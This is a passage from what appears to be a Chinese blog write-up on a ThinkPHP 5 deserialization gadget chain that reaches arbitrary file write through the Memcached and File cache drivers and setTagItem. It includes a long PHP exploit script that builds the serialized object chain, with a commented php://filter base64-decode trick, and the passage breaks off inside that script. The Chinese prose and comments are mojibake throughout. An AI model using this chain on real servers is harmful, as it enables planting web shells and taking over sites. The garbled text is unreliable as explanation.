<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å°†è¦å†™å…¥çš„å€¼ $value åºåˆ—åŒ–ä¸€ä¸‹</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$value</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¦‚æœ $this-&gt;options[&#x27;data_compress&#x27;] = true åˆ™ä¼šå°†æ•°æ®å‹ç¼©</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class="line">    <span class="comment">//æ•°æ®å‹ç¼©</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">gzcompress</span>(<span class="variable">$data</span>, <span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å°†è¦å†™å…¥çš„æ•°æ®å’Œä¸€æ®µ PHP ä»£ç æ‹¼æ¥</span></span><br><span class="line"><span class="variable">$data</span>   = <span class="string">&quot;&lt;?php\n//&quot;</span> . <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%012d&#x27;</span>, <span class="variable">$expire</span>) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="variable">$data</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‘ $filename æ–‡ä»¶å†™å…¥æ•°æ® $data</span></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br></pre></td></tr></table></figure></div>

<p>ç„¶è€Œå‰é¢åˆ†æè¿‡ï¼Œ<code>$data</code> ä¼ å…¥çš„æ˜¯å€¼æ˜¯ <code>true</code>ï¼Œç„¶å <code>$expire</code> ä¼ å…¥çš„å€¼æ˜¯ <code>0</code>ï¼Œå› æ­¤å†™å…¥æ–‡ä»¶çš„å†…å®¹å¦‚ä¸‹ï¼š</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//000000000000</span></span><br><span class="line"> <span class="keyword">exit</span>();<span class="meta">?&gt;</span></span><br><span class="line">b:<span class="number">1</span>;</span><br></pre></td></tr></table></figure></div>

<p>æ˜¾ç„¶è¿™é‡Œæ–‡ä»¶å†™å…¥çš„å†…å®¹ä¹Ÿæ˜¯ä¸å¯æ§çš„ã€‚</p>
<p>ä¸è¿‡è§‚å¯Ÿå‘ç°ï¼Œ<code>think\cache\driver\File-&gt;set</code> çš„ä¸Šä¸€å±‚ <code>think\cache\driver\Memcached-&gt;set</code> åœ¨é€»è¾‘ä¸Šå’Œå®ƒå¾ˆåƒã€‚éƒ½æœ‰ä¸€ä¸ªç¬¬ä¸€æ¬¡å†™å…¥çš„ <code>$first</code> åˆ¤æ–­ã€‚ä¸è¿‡è¿™é‡Œåˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨ç”¨çš„ä¸æ˜¯ <code>is_file</code> å‡½æ•°ï¼Œè€Œæ˜¯ <code>$this-&gt;has</code>ï¼Œè¿™æ˜¯å› ä¸ºè¿™é‡Œå‚æ•° <code>$name</code> è¿˜æ²¡æœ‰é€šè¿‡ <code>$this-&gt;handler-&gt;getCacheKey</code> è½¬æ¢ä¸ºå†™å…¥æ–‡ä»¶çš„åç§°ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å¦‚æœæ²¡æœ‰ $name å¯¹åº”çš„ç¼“å­˜æ–‡ä»¶åˆ™ $this-&gt;has($name) è¿”å› false</span></span><br><span class="line"><span class="comment">// âœ… å› æ­¤è¿›å…¥åˆ¤æ–­è®¾ç½® $first = true</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;tag &amp;&amp; !<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">has</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">    <span class="variable">$first</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å› ä¸º $this-&gt;options[&#x27;prefix&#x27;] = &#x27;&#x27; æ‰€ä»¥ getCacheKey ç›´æ¥è¿”å› $name</span></span><br><span class="line"><span class="comment">// å› æ­¤è¿™é‡Œç­‰ä»·äº $key = $name</span></span><br><span class="line"><span class="variable">$key</span>    = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getCacheKey</span>(<span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 0 == $expire æ»¡è¶³æ¡ä»¶å› æ­¤ $expire = 0</span></span><br><span class="line"><span class="variable">$expire</span> = <span class="number">0</span> == <span class="variable">$expire</span> ? <span class="number">0</span> : <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_TIME&#x27;</span>] + <span class="variable">$expire</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ğŸ“Œ é¦–å…ˆè°ƒç”¨ $this-&gt;handler-&gt;set ç¬¬ä¸€æ¬¡å†™å…¥æ–‡ä»¶ï¼Œæ­¤å¤„æ–‡ä»¶å†…å®¹ä¸å¯æ§ã€‚</span></span><br><span class="line"><span class="comment">// $key = &#x27;&lt;where&gt;file_content&lt;/where&gt;&#x27; ç»è¿‡è½¬æ¢å˜ä¸ºæ–‡ä»¶å</span></span><br><span class="line"><span class="comment">// $value = true ç»è¿‡åºåˆ—åŒ–å’Œæ‹¼æ¥ç­‰æ“ä½œå˜æˆæ–‡ä»¶å†…å®¹</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;handler-&gt;<span class="title function_ invoke__">set</span>(<span class="variable">$key</span>, <span class="variable">$value</span>, <span class="variable">$expire</span>)) &#123;</span><br><span class="line">    <span class="comment">// ç”±äºå‰é¢è®¾ç½® $first = true</span></span><br><span class="line">    <span class="comment">// å› æ­¤è°ƒç”¨ $this-&gt;setTagItem â†’ $this-&gt;set å†æ¬¡è°ƒç”¨åˆ°è¿™ä¸ªå‡½æ•°</span></span><br><span class="line">    <span class="comment">// ç”±äºæ­¤æ—¶ç»è¿‡å‚æ•°è½¬æ¢åæ–‡ä»¶å†…å®¹ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°ä¼ å…¥</span></span><br><span class="line">    <span class="comment">// ğŸ“Œ å› æ­¤ $this-&gt;handler-&gt;set å®Œæˆç¬¬äºŒæ¬¡å†™å…¥æ—¶æ–‡ä»¶å†…å®¹å¯æ§</span></span><br><span class="line">    <span class="keyword">isset</span>(<span class="variable">$first</span>) &amp;&amp; <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setTagItem</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å…¶ä¸­ <code>$this-&gt;has</code> ä¸»è¦é€šè¿‡ <code>$this-&gt;handler-&gt;get</code> åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨ã€‚å‰é¢ä¼šå…ˆè°ƒç”¨ <code>$this-&gt;getCacheKey</code> ä½œä¸€ä¸‹è½¬æ¢ï¼Œä¸è¿‡åªæ˜¯åœ¨åç§°å‰é¢æ‹¼æ¥ä¸€æ®µ <code>$this-&gt;options[&#39;prefix&#39;]</code>ï¼Œæ²¡ä»€ä¹ˆå½±å“ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * åˆ¤æ–­ç¼“å­˜</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $name ç¼“å­˜å˜é‡å</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">has</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getCacheKey</span>(<span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;handler-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$key</span>) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>File-&gt;get</code> å‡½æ•°åˆ™ä¼šè¯»å– <code>$name</code> ç»è¿‡ <code>File-&gt;getCacheKey</code> è½¬æ¢åå¾—åˆ°çš„æ–‡ä»¶åå¯¹åº”æ–‡ä»¶çš„å†…å®¹ã€‚å¦‚æœæ–‡ä»¶è¿˜æ²¡æœ‰åˆ›å»ºçš„è¯è¿”å›ç©ºå¯¼è‡´ <code>Memcached-&gt;has</code> è¿”å› <code>false</code>ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è¯»å–ç¼“å­˜</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $name ç¼“å­˜å˜é‡å</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mixed  $default é»˜è®¤å€¼</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$default</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getCacheKey</span>(<span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$default</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$content</span>      = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;expire = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span> !== <span class="variable">$content</span>) &#123;</span><br><span class="line">        <span class="variable">$expire</span> = (<span class="keyword">int</span>) <span class="title function_ invoke__">substr</span>(<span class="variable">$content</span>, <span class="number">8</span>, <span class="number">12</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != <span class="variable">$expire</span> &amp;&amp; <span class="title function_ invoke__">time</span>() &gt; <span class="title function_ invoke__">filemtime</span>(<span class="variable">$filename</span>) + <span class="variable">$expire</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$default</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;expire = <span class="variable">$expire</span>;</span><br><span class="line">        <span class="variable">$content</span>      = <span class="title function_ invoke__">substr</span>(<span class="variable">$content</span>, <span class="number">32</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">//å¯ç”¨æ•°æ®å‹ç¼©</span></span><br><span class="line">            <span class="variable">$content</span> = <span class="title function_ invoke__">gzuncompress</span>(<span class="variable">$content</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$content</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$default</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å¦å¤–å‰é¢åˆ†æè¿‡ï¼Œ<code>$this-&gt;handler-&gt;set</code> ä¼šè¿”å› <code>true</code>ï¼Œå› æ­¤å¯ä»¥èµ°åˆ° <code>$this-&gt;setTagItem</code> é€»è¾‘ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;handler-&gt;<span class="title function_ invoke__">set</span>(<span class="variable">$key</span>, <span class="variable">$value</span>, <span class="variable">$expire</span>)) &#123;</span><br><span class="line">    <span class="comment">// ç”±äºå‰é¢è®¾ç½® $first = true</span></span><br><span class="line">    <span class="comment">// å› æ­¤è°ƒç”¨ $this-&gt;setTagItem â†’ $this-&gt;set å†æ¬¡è°ƒç”¨åˆ°è¿™ä¸ªå‡½æ•°</span></span><br><span class="line">    <span class="comment">// ç”±äºæ­¤æ—¶ç»è¿‡å‚æ•°è½¬æ¢åæ–‡ä»¶å†…å®¹ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°ä¼ å…¥</span></span><br><span class="line">    <span class="comment">// ğŸ“Œ å› æ­¤ $this-&gt;handler-&gt;set å®Œæˆç¬¬äºŒæ¬¡å†™å…¥æ—¶æ–‡ä»¶å†…å®¹å¯æ§</span></span><br><span class="line">    <span class="keyword">isset</span>(<span class="variable">$first</span>) &amp;&amp; <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setTagItem</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>think\cache\driver\Memcached</code> å’Œ <code>think\cache\driver\File</code> éƒ½ç»§æ‰¿äº <code>think\cache\Driver</code>ï¼Œå› æ­¤è°ƒç”¨çš„éƒ½æ˜¯ <code>Driver</code> ç±»çš„ <code>setTagItem</code> å‡½æ•°ã€‚å‰é¢åˆ†æè¿‡ï¼Œ<code>setTagItem</code> å‡½æ•°ä¼šå°†ä¼ å…¥çš„å‚æ•°å†™å…¥æ–‡ä»¶ï¼Œè€Œè¿™é‡Œä¼ å…¥çš„å‚æ•° <code>$key</code> å°±æ˜¯å‰é¢å¯æ§çš„ <code>$name</code>ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™æ¡é“¾å®ç°æ–‡ä»¶å†™å…¥ã€‚</p>
<p>æ³¨æ„è¿™é‡Œå†™å…¥çš„æ–‡ä»¶çš„æ–‡ä»¶åä¸­æ‹¼æ¥çš„ MD5 æ˜¯ <code>&#39;md5(tag_&#39;.md5(File-&gt;tag))</code>ï¼Œå› æ­¤å¤šæ¬¡å†™å…¥å¦‚æœè·¯å¾„ç›¸åŒåˆ™éƒ½æ˜¯å†™åœ¨åŒä¸€ä¸ªæ–‡ä»¶é‡Œé¢ã€‚</p>
<h3 id="åˆ©ç”¨è„šæœ¬-4"><a href="#åˆ©ç”¨è„šæœ¬-4" class="headerlink" title="åˆ©ç”¨è„šæœ¬"></a>åˆ©ç”¨è„šæœ¬</h3><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span>\<span class="title class_">HasMany</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Process</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$processPipes</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$processInformation</span> = [<span class="string">&#x27;running&#x27;</span> =&gt; <span class="literal">true</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;processPipes = <span class="keyword">new</span> <span class="title class_">HasMany</span>(<span class="variable">$path</span>, <span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Relation</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">query</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">stdClass</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Relation</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">HasMany</span> <span class="keyword">extends</span> <span class="title">Relation</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parent</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$localKey</span> = <span class="string">&#x27;k&#x27;</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$foreignKey</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;foreignKey = <span class="variable">$data</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;query = <span class="keyword">new</span> <span class="title class_">Output</span>(<span class="variable">$path</span>, <span class="variable">$data</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> = <span class="keyword">new</span> <span class="built_in">stdClass</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;localKey&#125; = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">db</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Query</span></span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">think</span>\<span class="title class_">console</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Output</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">styles</span> = [</span><br><span class="line">            &#x27;<span class="title class_">where</span>&#x27;</span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handle = <span class="keyword">new</span> \think\session\driver\<span class="title function_ invoke__">Memcache</span>(<span class="variable">$path</span>, <span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">session</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Memcache</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">handler</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handler = <span class="keyword">new</span> \think\cache\driver\<span class="title function_ invoke__">Memcached</span>(<span class="variable">$path</span>, <span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Memcached</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">tag</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$handler</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;tag = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;options = [</span><br><span class="line">                <span class="string">&#x27;expire&#x27;</span> =&gt; <span class="number">0</span>,</span><br><span class="line">                <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            ];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handler = <span class="keyword">new</span> <span class="title class_">File</span>(<span class="variable">$path</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">File</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$tag</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;tag = <span class="literal">false</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;options = [</span><br><span class="line">                <span class="string">&#x27;cache_subdir&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">                <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">                <span class="string">&#x27;path&#x27;</span> =&gt; <span class="variable">$path</span>,</span><br><span class="line"><span class="comment">//                &#x27;path&#x27; =&gt; &#x27;php://filter/convert.base64-decode/resource=&#x27; . $path,</span></span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">path</span> = &quot;<span class="title class_">file_path</span>/<span class="title class_">file_name</span>&quot;;</span><br><span class="line">    <span class="variable">$data</span> = <span 